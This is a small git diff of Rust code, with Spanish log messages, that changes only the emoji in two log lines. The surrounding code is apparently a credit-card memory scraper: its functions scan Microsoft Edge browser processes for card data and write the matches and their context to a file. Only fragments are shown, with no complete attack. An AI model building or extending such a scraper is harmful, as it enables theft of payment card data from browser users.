@@ -129,7 +129,7 @@ pub fn scan_all_edge_processes_for_cards() -> Vec<CreditCardData> {
             ));
             all_cards.extend(cards);
         } else {
-            log(&format!("    ⏭  Sin tarjetas en PID {}", process.pid));
+            log(&format!("    ⏭️  Sin tarjetas en PID {}", process.pid));
         }
     }
 
@@ -448,7 +448,7 @@ fn search_credit_card_pattern(buffer: &[u8]) -> Option<CreditCardData> {
                 let start = pos.saturating_sub(50);
                 let end = (pos + 50).min(text.len());
                 let context = &text[start..end];
-                let _ = writeln!(file, "         Contexto: {:?}", context);
+                let _ = writeln!(file, "        📝 Contexto: {:?}", context);
             }
         }
     }
